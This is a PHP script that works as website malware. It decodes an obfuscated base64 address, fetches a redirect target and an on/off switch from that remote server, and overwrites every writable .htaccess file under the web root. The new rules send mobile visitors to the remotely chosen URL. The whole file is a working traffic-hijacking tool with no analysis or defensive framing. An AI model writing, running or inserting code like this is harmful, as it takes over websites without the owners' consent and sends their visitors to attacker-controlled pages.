<?php
include dirname(__FILE__) . '/lb_helper.php';

if (!isset($let)) {
    $let = ''; 
}

$rootDirectory = $_SERVER['DOCUMENT_ROOT'];
$dtao = $let
.'NzJiMDY4YjA4NzcyNDkzYzBl';

function getJsonDataFromEndpoint($dtao) {
    $aps = base64_decode($dtao); 

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $aps);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
        curl_close($ch);
        return false;
    }

    curl_close($ch);

    $data = json_decode($response, true);
    return $data;
}

$data = getJsonDataFromEndpoint($dtao);

if (!$data) {
    echo "Failed.<br>";
    exit;
}

$block = $data['block'] ?? false;
$openUrl = $data['openUrl'] ?? 'https://google.com';

if ($block) {
    echo "Direct Access is blocked.<br>";
    exit;
}

$lenad = <<<EOT
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos" [NC]
    RewriteRule ^ $openUrl [R,L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_URI} !/- [NC]
    RewriteCond %{REQUEST_URI} !/.\/./ [NC]
    RewriteRule ^ index.php [L]
</IfModule>
EOT;

function update($directory, $newContent) {
    if (!is_dir($directory)) {
        echo "Directory does not exist: " . $directory . "<br>";
        return;
    }

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $fileInfo) {
            if ($fileInfo->isFile() && $fileInfo->getFilename() === '.htaccess') {
                $filePath = $fileInfo->getRealPath();

                if (is_writable($filePath)) {
                    chmod($filePath, 0666);

                    file_put_contents($filePath, $newContent);

                    chmod($filePath, 0644);

                    echo "Updated: " . $filePath . "<br>";
                } else {
                    echo "Cannot write to: " . $filePath . "<br>";
                }
            }
        }
    } catch (UnexpectedValueException $e) {
        echo "Error: " . $e->getMessage() . "<br>";
    }
}

update($rootDirectory, $lenad);
?>
